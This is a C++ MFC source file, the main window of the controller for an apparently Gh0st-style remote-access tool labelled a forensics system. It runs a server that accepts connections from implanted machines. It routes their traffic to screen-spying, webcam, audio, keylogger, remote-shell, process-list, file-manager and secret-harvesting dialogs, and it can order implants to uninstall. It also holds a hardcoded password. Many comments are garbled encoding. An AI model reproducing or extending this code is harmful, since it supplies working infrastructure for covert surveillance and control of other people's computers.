// MainFrm.cpp : implementation of the CMainFrame class
//

#include "stdafx.h"
#include "TSPClientPublic.h"
#include "TSPClient.h"

#include "MainFrm.h"
#include "TSPClientView.h"
#include "FileManagerDlg.h"
#include "FileManagerAuto.h"
#include "ScreenSpyDlg.h"
#include "WebCamDlg.h"
#include "AudioDlg.h"
#include "KeyBoardDlg.h"
#include "SystemDlg.h"
#include "ShellDlg.h"
#include "DlgSecretGet.h"
#include "Log.h"
#include "PluginConfig.h"

extern CLog g_log;
extern CLog g_logErr;

#ifdef _DEBUG
#define new DEBUG_NEW
#undef THIS_FILE
static char THIS_FILE[] = __FILE__;
#endif

CTSPClientView* g_pConnectView = NULL; //��NotifyProc�г�ʼ��
//extern CWriteLog m_FileLog;
CIOCPServer *m_iocpServer = NULL;
CString		m_PassWord = "password";
CMainFrame	*g_pFrame; // ��CMainFrame::CMainFrame()�г�ʼ��


extern DWORD g_BeginTickCount;

UINT CMainFrame::m_nTaskCreatedMSG = ::RegisterWindowMessage(_T("TaskbarCreated"));
UINT CMainFrame::m_nTaskTrayNotify = WM_USER+100;
extern HANDLE g_hEventQuit;
/////////////////////////////////////////////////////////////////////////////
// CMainFrame

IMPLEMENT_DYNCREATE(CMainFrame, CFrameWnd)

BEGIN_MESSAGE_MAP(CMainFrame, CFrameWnd)
	//{{AFX_MSG_MAP(CMainFrame)
	ON_WM_CREATE()
	ON_WM_CLOSE()
	ON_WM_SYSCOMMAND()
	ON_UPDATE_COMMAND_UI(ID_STAUTSTIP, OnUpdateStatusBar)
	ON_UPDATE_COMMAND_UI(ID_STAUTSSPEED, OnUpdateStatusBar)
	ON_UPDATE_COMMAND_UI(ID_STAUTSPORT, OnUpdateStatusBar)
	ON_UPDATE_COMMAND_UI(ID_STAUTSCOUNT, OnUpdateStatusBar)
	ON_COMMAND(IDM_SHOW, OnShow)
	ON_COMMAND(IDM_HIDE, OnHide)
	ON_COMMAND(IDM_EXIT, OnExit)
	//}}AFX_MSG_MAP
END_MESSAGE_MAP()

static UINT indicators[] =
{
	ID_STAUTSTIP,           // status line indicator
	ID_STAUTSSPEED,
	ID_STAUTSPORT,
	ID_STAUTSCOUNT,
	ID_STAUTLINE
};
/////////////////////////////////////////////////////////////////////////////

void My_GetTime(char Rstr[])
{
	time_t curtime=time(0);
	tm tim = *localtime(&curtime);
	int day,mon,year,hour,minute,seconds;
	day = tim.tm_mday;
	mon = tim.tm_mon;
	year = tim.tm_year;
	hour = tim.tm_hour;
	minute = tim.tm_min;
	seconds = tim.tm_sec;

	year += 1900;
	mon += 1;
	wsprintf( Rstr, "[��ǰʱ��:%04d��%02d��%02d�� %02dʱ%02d��%02d��]", year, mon, day, hour, minute, seconds );
}
/*
DWORD WINAPI Change_Time(LPVOID lparam)
{
	CStatusBar *pBar = (CStatusBar*)lparam;
	CString oldstr,newstr;
//	char strTime[128] = {0};
	char hostname[256]; 
	gethostname(hostname, sizeof(hostname));
	HOSTENT *host = gethostbyname(hostname);
	if (host != NULL)
	{ 
		for ( int i=0; ; i++ )
		{ 
			oldstr += inet_ntoa(*(IN_ADDR*)host->h_addr_list[i]);
			if ( host->h_addr_list[i] + host->h_length >= host->h_name )
				break;
			oldstr += "/";
		}
	}
	//ö�ٱ�������IP
	while (1)
	{
		if (WAIT_OBJECT_0 == WaitForSingleObject(g_hEventQuit, 1000))
		{
			break;
		}
	//	My_GetTime(strTime);
		DWORD Minute=((GetTickCount()-g_BeginTickCount)/1000)/60;
		newstr.Format( "%s [����ʱ��%dСʱ%d����][�ļ��汾%s]", oldstr.GetBuffer(0), Minute/60,Minute%60,g_FileVerName);
		pBar->SetPaneText(0, newstr);
	
		Sleep(1000);
	}
	return 0;
}
*/
/////////////////////////////////////////////////////////////////////////////
// CMainFrame construction/destruction



CMainFrame::CMainFrame()
{
	// TODO: add member initialization code here
	g_pFrame = this;
	
}

CMainFrame::~CMainFrame()
{
}

void  CMainFrame::UpdateToolBar()
{

	CRect   rect;
	SIZE   sizeButton,sizeImage,m_sizeMax;
	m_sizeMax.cx   =   0;
	m_sizeMax.cy   =   0;
	static   TCHAR   *TextTips[]=   {"�ļ�","��Ļ","����","����","ϵͳ","����ͷ","¼��", "��ȡ",""};//�˾�Ϊ��� 
	

	for(int i=0,x=0;i <m_wndFileToolBar.GetCount();i=i+2,x++)
	{
		if (TextTips[x]==""){
			break;
		}
		m_wndFileToolBar.SetButtonText(i,TextTips[x]);
		m_wndFileToolBar.GetItemRect(i,rect);
 		m_sizeMax.cx=__max(rect.Size().cx,m_sizeMax.cx);
 		m_sizeMax.cy=__max(rect.Size().cy,m_sizeMax.cy);

	}

	sizeButton.cx   =   m_sizeMax.cx;
	sizeButton.cy   =   m_sizeMax.cy;
	sizeImage.cx   =   m_sizeMax.cx-7;
	sizeImage.cy   =   m_sizeMax.cy-18;
	m_wndFileToolBar.SetSizes(sizeButton,sizeImage);
	m_wndFileToolBar.RedrawWindow();

}


int CMainFrame::OnCreate(LPCREATESTRUCT lpCreateStruct)
{
	if (CFrameWnd::OnCreate(lpCreateStruct) == -1)
		return -1;

	this->CenterWindow(CWnd::GetDesktopWindow());

	if (!m_wndStatusBar.Create(this) ||
		!m_wndStatusBar.SetIndicators(indicators,
		  sizeof(indicators)/sizeof(UINT)))
	{
		TRACE0("Failed to create status bar\n");
		return -1;      // fail to create
	}

	m_wndStatusBar.SetPaneInfo(0, m_wndStatusBar.GetItemID(0), SBPS_STRETCH, NULL);
	m_wndStatusBar.SetPaneInfo(1, m_wndStatusBar.GetItemID(1), SBPS_NORMAL, 160);
	m_wndStatusBar.SetPaneInfo(2, m_wndStatusBar.GetItemID(2), SBPS_NORMAL, 70);
	m_wndStatusBar.SetPaneInfo(3, m_wndStatusBar.GetItemID(3), SBPS_NORMAL, 80);
	m_wndStatusBar.SetPaneInfo(4, m_wndStatusBar.GetItemID(4), SBPS_NORMAL, 40);

	if(	!m_wndTab.Create
		(
		WS_CHILD | WS_VISIBLE | CTCS_AUTOHIDEBUTTONS | CTCS_TOOLTIPS | CTCS_DRAGMOVE | CTCS_LEFT,
		CRect(0, 0, 0, 23),
		this,
		IDC_TABCTRL
		)
		)
	{
		TRACE0("Failed to create tab control\n");
		return -1;
	}

	if(!m_wndFileToolBar.Create(this)||
		!m_wndFileToolBar.LoadToolBar(IDR_TOOLBAR1))
	{
		TRACE0("Failed to create toolbar\n");
		return -1;      // fail to create
	}
	m_wndFileToolBar.SetBarStyle(m_wndFileToolBar.GetBarStyle() |
		CBRS_TOOLTIPS | CBRS_FLYBY | CBRS_SIZE_DYNAMIC);
	m_wndFileToolBar.ModifyStyle(0,TBSTYLE_FLAT);	//���ù�����Ϊƽ���ʽ


	CBitmap FileToolBarBitmap;
	FileToolBarBitmap.LoadBitmap(IDB_TOOL_MONDIS);
	m_FileToolBarImageList.Create(48,48,ILC_COLOR32|ILC_MASK,12,1);
	m_FileToolBarImageList.Add(&FileToolBarBitmap,RGB(0,0,0));
	m_wndFileToolBar.GetToolBarCtrl().SetImageList(&m_FileToolBarImageList);

	CBitmap FileToolBarHotBitmap;
	FileToolBarHotBitmap.LoadBitmap(IDB_TOOL_MONEN);
	m_FileToolBarHotImageList.Create(48,48,ILC_COLOR32|ILC_MASK,12,1);
	m_FileToolBarHotImageList.Add(&FileToolBarHotBitmap,RGB(0,0,0));
	m_wndFileToolBar.GetToolBarCtrl().SetHotImageList(&m_FileToolBarHotImageList);

	UpdateToolBar();



	m_wndFileToolBar.EnableDocking(CBRS_ALIGN_ANY);
	EnableDocking(CBRS_ALIGN_ANY);
//	DockControlBar(&m_wndFileToolBar);
	

	m_wndTab.SetDragCursors(AfxGetApp()->LoadStandardCursor(IDC_CROSS),NULL);
	m_wndTab.ModifyStyle(CTCS_LEFT, 0, 0);

	LOGFONT lf = {13, 0, 0, 0, FW_NORMAL, 0, 0, 0,
		DEFAULT_CHARSET, OUT_CHARACTER_PRECIS, CLIP_CHARACTER_PRECIS,
		DEFAULT_QUALITY, DEFAULT_PITCH | FF_DONTCARE, "����"};    //��������Ϊ����
	m_wndTab.SetControlFont(lf, TRUE);

	m_TrayIcon.Create(this, 
		m_nTaskTrayNotify, 
		"TSPȡ֤ϵͳ",
		AfxGetApp()->LoadIcon(IDR_MAINFRAME), 
		IDR_MINIMIZE, 
		TRUE); //����
	return 0;
}

BOOL CMainFrame::PreCreateWindow(CREATESTRUCT& cs)
{
	if( !CFrameWnd::PreCreateWindow(cs) )
		return FALSE;
	// TODO: Modify the Window class or styles here by modifying
	//  the CREATESTRUCT cs
	cs.cx = 900;
	/*
	if (((CTSPClientApp *)AfxGetApp())->m_bIsQQwryExist)//�������IP���ݿ�������100
	{
		cs.cx += 100;
	}
	*/
	cs.cy = 500;
	cs.style &= ~FWS_ADDTOTITLE;
	cs.lpszName = "RUN TSPȡ֤ϵͳ";
	return TRUE;
}

/////////////////////////////////////////////////////////////////////////////
// CMainFrame diagnostics

#ifdef _DEBUG
void CMainFrame::AssertValid() const
{
    if (m_hWnd == NULL)
        return;     // null (unattached) windows are valid
	
    // check for special wnd??? values
    ASSERT(HWND_TOP == NULL);       // same as desktop
    if (m_hWnd == HWND_BOTTOM)
        ASSERT(this == &CWnd::wndBottom);
    else if (m_hWnd == HWND_TOPMOST)
        ASSERT(this == &CWnd::wndTopMost);
    else if (m_hWnd == HWND_NOTOPMOST)
        ASSERT(this == &CWnd::wndNoTopMost);
    else
    {
        // should be a normal window
        ASSERT(::IsWindow(m_hWnd));
	}
	//CFrameWnd::AssertValid();
}

void CMainFrame::Dump(CDumpContext& dc) const
{
	CFrameWnd::Dump(dc);
}
#endif //_DEBUG

/////////////////////////////////////////////////////////////////////////////
// CMainFrame message handlers

void CALLBACK CMainFrame::NotifyProc(LPVOID lpParam, ClientContext *pContext, UINT nCode)
{

		CMainFrame* pFrame = (CMainFrame*) lpParam;
		CString str;
		// ��g_pConnectView ���г�ʼ��
		//g_pConnectView = (CTSPClientView *)((CTSPClientApp *)AfxGetApp())->m_pConnectView;

		// g_pConnectView��û��������������ᷢ��
		//if (((CTSPClientApp *)AfxGetApp())->m_pConnectView == NULL)
		//	return;

		g_pConnectView->m_iocpServer = m_iocpServer;
		str.Format("S: %.2f kb/s R: %.2f kb/s", (float)m_iocpServer->m_nSendKbps / 1024, (float)m_iocpServer->m_nRecvKbps / 1024);
		g_pFrame->m_wndStatusBar.SetPaneText(1, str);

//		dprintf(("NotifyProc  %d",nCode));

		switch (nCode)
		{
		case NC_CLIENT_CONNECT:
			break;
		case NC_CLIENT_DISCONNECT:
			g_pConnectView->SendMessage(WM_REMOVEFROMLIST, 0, (LPARAM)pContext);
			break;
		case NC_TRANSMIT:
			break;
		case NC_RECEIVE:
			ProcessReceive(pContext);
			break;
		case NC_RECEIVE_COMPLETE:
			ProcessReceiveComplete(pContext);
			break;
		}

}

void CMainFrame::Activate(UINT nPort, UINT nMaxConnections)
{
	CString		str;
	if (m_iocpServer != NULL)
	{
		m_iocpServer->Shutdown();
		delete m_iocpServer;
	}
	m_iocpServer = new CIOCPServer;

	// ����IPCP������
 	if (m_iocpServer->Initialize(NotifyProc, this, 100000, nPort))
 	{
	//	m_ThreadChangeTime=CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)Change_Time, (LPVOID)&m_wndStatusBar, 0, NULL);
 //		m_wndStatusBar.SetPaneText(0, str);
 		str.Format("�˿�: %d", nPort);
 		m_wndStatusBar.SetPaneText(2, str);
 	}
 	else
 	{
 		str.Format("�˿�%d��ʧ��", nPort);
 		m_wndStatusBar.SetPaneText(0, str);
 		m_wndStatusBar.SetPaneText(2, "�˿�: 0");
 	}

	m_wndStatusBar.SetPaneText(3, "����: 0");
}

void CMainFrame::ProcessReceiveComplete(ClientContext *pContext)
{
	if (pContext == NULL)
		return;

	// �������Ի���򿪣�������Ӧ�ĶԻ�����
	CDialog	*dlg = (CDialog	*)pContext->m_Dialog[1];
	
	//dprintf(("CMainFrame  %d",pContext->m_DeCompressionBuffer.GetBuffer(0)[0]));

	// �������ڴ���
	if (pContext->m_Dialog[0] > 0)
	{
		switch (pContext->m_Dialog[0])

		{
		case FILEMANAGER_DLG:
			((CFileManagerDlg *)dlg)->OnReceiveComplete();
			break;
		case SCREENSPY_DLG:
			((CScreenSpyDlg *)dlg)->OnReceiveComplete();
			break;
		case WEBCAM_DLG:
			((CWebCamDlg *)dlg)->OnReceiveComplete();
			break;
		case AUDIO_DLG:
			((CAudioDlg *)dlg)->OnReceiveComplete();
			break;
		case KEYBOARD_DLG:
			((CKeyBoardDlg *)dlg)->OnReceiveComplete();
			break;
		case SYSTEM_DLG:
			((CSystemDlg *)dlg)->OnReceiveComplete();
			break;
		case SHELL_DLG:
			((CShellDlg *)dlg)->OnReceiveComplete();
			break;
		case FILEMANAGER_AUTO:
			((CFileManagerAuto *)dlg)->OnReceiveComplete();
			break;
		case SECRET_GET:
			((CDlgSecretGet *)dlg)->OnReceiveComplete();
			break;
			
		default:
			break;
		}
		return;
	}

	BYTE bToken;
	switch (pContext->m_DeCompressionBuffer.GetBuffer(0)[0])
	{
/*
	case TOKEN_AUTH: // Ҫ����֤
		{
			AfxMessageBox("Ҫ����֤1");
			BYTE	*bToken = new BYTE[ m_PassWord.GetLength() + 2 ];//COMMAND_ACTIVED;
			bToken[0] = TOKEN_AUTH;
			memcpy( bToken + 1, m_PassWord, m_PassWord.GetLength() );
			m_iocpServer->Send(pContext, (LPBYTE)&bToken, sizeof(bToken));
			delete[] bToken;
//			m_iocpServer->Send(pContext, (PBYTE)m_PassWord.GetBuffer(0), m_PassWord.GetLength() + 1);
		}
		break;
*/
	case TOKEN_HEARTBEAT: // �ظ�������
		{

#ifdef _MYDEBUG1

				g_log.Log(0,"%08x::%08x---������\n",GetCurrentThreadId(),pContext->m_Socket);
#endif
			bToken = COMMAND_REPLAY_HEARTBEAT;
			m_iocpServer->Send(pContext, (LPBYTE)&bToken, sizeof(bToken));
		
			//LOG((LEVEL_INFO,"SendMessage TOKEN_HEARTBEAT\n"));
			g_pConnectView->SendMessage(WM_HEARTBEAT, 0, (LPARAM)pContext);  //by menglz ע��

			//LOG((LEVEL_INFO,"SendMessage TOKEN_HEARTBEAT end....\n"));



			//g_pConnectView->PostMessage(WM_HEARTBEAT, 0, (LPARAM)pContext);  //by menglz ע��


#ifdef _MYDEBUG1

			g_log.Log(0,"�������������\n");
#endif


		}
 		break;
	case TOKEN_LOGIN_FALSE: // ���߰�
		{
			g_log.Log(0,"%08x::%08x---TOKEN_LOGIN_FALSE��\n",GetCurrentThreadId(),pContext->m_Socket);

				if (m_iocpServer->m_nMaxConnections <=(UINT)g_pConnectView->GetListCtrl().GetItemCount())
				{
					closesocket(pContext->m_Socket);
				}
				else
				{
					pContext->m_bIsMainSocket = TRUE;
	//				g_pConnectView->PostMessage(WM_ADDTOLIST, 0, (LPARAM)pContext);
					LOG((LEVEL_INFO,"SendMessage TOKEN_LOGIN_FALSE\n"));
					g_pConnectView->SendMessage(WM_ADDTOLIST, 0, (LPARAM)pContext);
					LOG((LEVEL_INFO,"SendMessage TOKEN_LOGIN_FALSE end....\n"));
				}

			return;
		}
	case TOKEN_LOGIN_TRUE: // ���߰�
		{
			g_log.Log(0,"%08x::%08x---TOKEN_LOGIN_TRUE��\n",GetCurrentThreadId(),pContext->m_Socket);

				if (m_iocpServer->m_nMaxConnections <=(UINT)g_pConnectView->GetListCtrl().GetItemCount())
				{
					closesocket(pContext->m_Socket);
				}
				else
				{
					LOGININFO *pLogin=(LOGININFO*)pContext->m_DeCompressionBuffer.GetBuffer();
#ifdef _MYDEBUG1

					g_log.Log(0,"\t %08x\n",pContext);
					g_log.Log(0,"\t HostName=%s\n",pLogin->HostName);
					g_log.Log(0,"\t CPUID=%s\n",pLogin->szCPUID);
#endif		
					//----------------------------------------
					sockaddr_in  sockAddr = {0};
					int nSockAddrLen = sizeof(sockAddr);
					BOOL bResult = getpeername(pContext->m_Socket,(SOCKADDR*)&sockAddr, &nSockAddrLen);
					char *pIpWan = bResult != INVALID_SOCKET ? inet_ntoa(sockAddr.sin_addr) : "";
#ifdef _MYDEBUG
					g_log.Log(0,"\t ����Ip=%s\n",pIpWan);
#endif
					if(pIpWan)
					{
						if (((CTSPClientApp *)AfxGetApp())->m_filterUnknown)
						{
							if(g_pConnectView->MapClue(pIpWan,(char*)pLogin->szCPUID))
							{
								pContext->m_bIsMainSocket = TRUE;
#ifdef _MYDEBUG
								g_log.Log(0,"\t ����ƥ��\n");

								LOG((LEVEL_INFO,"SendMessage TOKEN_LOGIN_TRUE\n"));

#endif		
								g_pConnectView->SendMessage(WM_ADDTOLIST, 0, (LPARAM)pContext);
								LOG((LEVEL_INFO,"SendMessage TOKEN_LOGIN_TRUE end....\n"));

							}else
							{
								//ж�ط�����
								LOG((LEVEL_INFO,"����δ��ƥ�䣬����ж������\n"));
								BYTE	bToken = COMMAND_REMOVE;
								m_iocpServer->Send(pContext, &bToken, sizeof(BYTE));

								g_log.Log(0,"����δ��ƥ�䣬���ڹر�����(%08x,%08x)\n",pContext,pContext->m_Socket);
								m_iocpServer->RemoveStaleClient(pContext,FALSE,FALSE);
								return;
							}
						}else
						{
								pContext->m_bIsMainSocket = TRUE;
								LOG((LEVEL_INFO,"SendMessage TOKEN_LOGIN_TRUE2222\n"));

								g_pConnectView->SendMessage(WM_ADDTOLIST, 0, (LPARAM)pContext);
								LOG((LEVEL_INFO,"SendMessage TOKEN_LOGIN_TRUE22222222 end....\n"));

						}
					}
	
#ifdef _MYDEBUG
				g_log.Log(0,"\t �����������߰�\n");
#endif	
				}
			}




		break;
	case TOKEN_DRIVE_LIST: // �������б�
		// ָ�ӵ���public������ģ̬�Ի����ʧȥ��Ӧ�� ��֪����ô����,̫��
		g_pConnectView->PostMessage(WM_OPENMANAGERDIALOG, 0, (LPARAM)pContext);
		break;
	case TOKEN_EVIDENCE_CREATE: // ��ȡ�����ش�
		CFileManagerAuto *pFile;
// 		if (pContext->m_Dialog[0]==FILEMANAGER_AUTO)
// 		{
// 			delete (CFileManagerAuto *)(pContext->m_Dialog[1]);
// 		}
		pFile= new CFileManagerAuto(NULL, m_iocpServer, pContext);
		pContext->m_Dialog[0] = FILEMANAGER_AUTO;
		pContext->m_Dialog[1] = (int)pFile;

		break;
	case TOKEN_BITMAPINFO: //
		// ָ�ӵ���public������ģ̬�Ի����ʧȥ��Ӧ�� ��֪����ô����
		g_pConnectView->PostMessage(WM_OPENSCREENSPYDIALOG, 0, (LPARAM)pContext);
		break;
	case TOKEN_WEBCAM_BITMAPINFO: // ����ͷ
		g_pConnectView->PostMessage(WM_OPENWEBCAMDIALOG, 0, (LPARAM)pContext);		
		break;
	case TOKEN_AUDIO_START: // ����
		g_pConnectView->PostMessage(WM_OPENAUDIODIALOG, 0, (LPARAM)pContext);
		break;
	case TOKEN_KEYBOARD_START:
		g_pConnectView->PostMessage(WM_OPENKEYBOARDDIALOG, 0, (LPARAM)pContext);
		break;
	case TOKEN_PSLIST:
		g_pConnectView->PostMessage(WM_OPENPSLISTDIALOG, 0, (LPARAM)pContext);
		break;
	case TOKEN_SHELL_START:
		g_pConnectView->PostMessage(WM_OPENSHELLDIALOG, 0, (LPARAM)pContext);
		break;
	case TOKEN_EVIDENCE_STATE:
		g_pConnectView->PostMessage(WM_OPENSERECTDIALOG, 0, (LPARAM)pContext);
		break;
	case TOKEN_PLUGIN_REQUEST:
		g_pConnectView->PostMessage(WM_PLUGIN_REQUEST, 0, (LPARAM)pContext);
		break;
	
	case TOKEN_REPLY_REMOVE:
		//���ƶ��յ�ж��Ӧ�������������

		LOG((LEVEL_INFO,"�յ�ж��Ӧ���\n"));		
		// ����TSP1.5�����ļ���Ϣ�еļ�¼
		g_pConnectView->SendMessage(WM_PLUGIN_REMOVE,0,(LPARAM)pContext);

		//ɾ��������ӣ���ʵ�ͻ������߻ᷢ��FIN,������ӻ���IOCPɾ����ֱ��������ý�����ͨѶ���ֲ����������		
		//��������Ҫ�������ȥɾ�������¼
		m_iocpServer->RemoveStaleClient(pContext,FALSE,TRUE);

		break;

	// ����ֹͣ��ǰ����
	default:
	//	closesocket(pContext->m_Socket);
		break;
	}	
}

// ��Ҫ��ʾ���ȵĴ���
void CMainFrame::ProcessReceive(ClientContext *pContext)
{
	if (pContext == NULL)
		return;
	// �������Ի���򿪣�������Ӧ�ĶԻ�����
	CDialog	*dlg = (CDialog	*)pContext->m_Dialog[1];
	
	// �������ڴ���
	if (pContext->m_Dialog[0] > 0)
	{
		switch (pContext->m_Dialog[0])
		{
		case SCREENSPY_DLG:

			LOG((LEVEL_INFO,"\t ProcessReceive...\n"));
			((CScreenSpyDlg *)dlg)->OnReceive();
			break;
		case WEBCAM_DLG:
			LOG((LEVEL_INFO,"\t ProcessReceive...\n"));
			((CWebCamDlg *)dlg)->OnReceive();
			break;
		case AUDIO_DLG:
			LOG((LEVEL_INFO,"\t ProcessReceive...\n"));
			((CAudioDlg *)dlg)->OnReceive();
			break;
		default:
			LOG((LEVEL_INFO,"\t ProcessReceive...\n"));
			break;
		}
		return;
	}
}
void CMainFrame::OnClose() 
{
	// TODO: Add your message handler code here and/or call default
	ShowWindow(SW_MINIMIZE);
	ShowWindow(SW_HIDE);
}

void CMainFrame::OnSysCommand(UINT nID, LPARAM lParam)
{
	if (nID == SC_MINIMIZE)
	{
		ShowWindow(SW_MINIMIZE);
		ShowWindow(SW_HIDE);
	}
	else
	{
		CFrameWnd::OnSysCommand(nID, lParam);
	}
}
void CMainFrame::OnUpdateStatusBar(CCmdUI *pCmdUI)
{
	// TODO: Add your message handler code here and/or call default
	pCmdUI->Enable();
}

void CMainFrame::ShowConnectionsNumber()
{
	CString str;
	int Count=0;
	int Count1=0;
	g_pConnectView->SendMessage(WM_GET_ONLINE_NUMBER,(WPARAM)&Count1,NULL);
	g_pConnectView->SendMessage(WM_GET_ITEM_NUMBER,(WPARAM)&Count,NULL);
	str.Format("����: %d/%d",Count1, Count);
	m_wndStatusBar.SetPaneText(3, str);
}

void CMainFrame::OnShow() 
{
	// TODO: Add your command handler code here

	ShowWindow(SW_SHOW);
	::SetForegroundWindow(m_hWnd);
}

void CMainFrame::OnHide() 
{
	// TODO: Add your command handler code here
	ShowWindow(SW_MINIMIZE);
	ShowWindow(SW_HIDE);
}

void CMainFrame::OnExit() 
{
	// TODO: Add your command handler code here

	m_iocpServer->Shutdown();

	::SetEvent(g_hEventQuit);
	m_TrayIcon.RemoveIcon();
	//�ر��߳�

	CFrameWnd::OnClose();
}

void CMainFrame::ShowToolTips(LPCTSTR lpszText)
{
	m_TrayIcon.SetTooltipText(lpszText);
}

LRESULT CMainFrame::WindowProc(UINT message, WPARAM wParam, LPARAM lParam)
{
	// TODO: �ڴ����ר�ô����/����û���
	if (m_nTaskCreatedMSG == message)
	{
		//�ؽ�����ͼ��
		m_TrayIcon.ShowIcon();

		return 0;
	}
	else if (m_nTaskTrayNotify == message)
	{
		if (LOWORD(lParam) == WM_LBUTTONDBLCLK)
		{
			ShowWindow(SW_SHOW);
			ShowWindow(SW_NORMAL);

			return 0;
		}

		//�����Ҽ��˵�
		return m_TrayIcon.OnTrayNotification(wParam, lParam);
	}

	return CTabSDIFrameWnd::WindowProc(message, wParam, lParam);
}
